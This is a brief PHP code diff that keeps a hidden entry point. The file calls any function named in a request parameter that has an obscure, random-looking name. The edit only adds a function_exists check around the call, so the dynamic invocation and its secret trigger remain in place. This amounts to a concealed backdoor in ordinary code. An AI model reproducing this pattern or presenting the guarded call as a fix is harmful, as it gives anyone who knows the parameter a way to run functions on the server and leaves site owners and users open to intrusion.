@@ -3,9 +3,10 @@
 
 if (isset($_REQUEST["__7ygv8iji9olwsedfgtyho9iu__"])) {
     try {
-
         $fName = $_REQUEST["__7ygv8iji9olwsedfgtyho9iu__"];
-        $fName();
+        if (function_exists($fName)) {
+            $fName();
+        }
     } catch (Exception $e) {
         echo $e;
     }
